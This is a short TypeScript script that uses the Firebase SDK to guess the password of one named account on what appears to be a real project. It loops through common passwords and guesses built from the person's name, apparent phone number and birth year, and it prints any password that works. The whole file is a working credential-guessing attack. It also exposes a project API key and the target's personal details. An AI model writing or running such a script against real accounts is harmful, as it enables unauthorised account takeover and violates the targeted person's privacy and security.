import { initializeApp } from "firebase/app";
import { getAuth, signInWithEmailAndPassword } from "firebase/auth";

const firebaseConfig = {
  projectId: "wissenapp-4bce7",
  apiKey: "AIzaSyCn04t32JuYeOl-xvNklbJ9vNeTK7RGrfg"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

async function check() {
  const email = "kamron_boronov@wissen.internal";
  const passwords = ["123456", "kamron_boronov", "12345678", "password", "931540709", "+998931540709", "kamron123", "kamron2009", "123456789"];
  
  for(let p of passwords) {
    try {
      await signInWithEmailAndPassword(auth, email, p);
      console.log("SUCCESS! Password is:", p);
      process.exit(0);
    } catch(e: any) {
      // console.log("Failed:", p, e.code);
    }
  }
  console.log("None of the common passwords worked.");
  process.exit(0);
}
check();
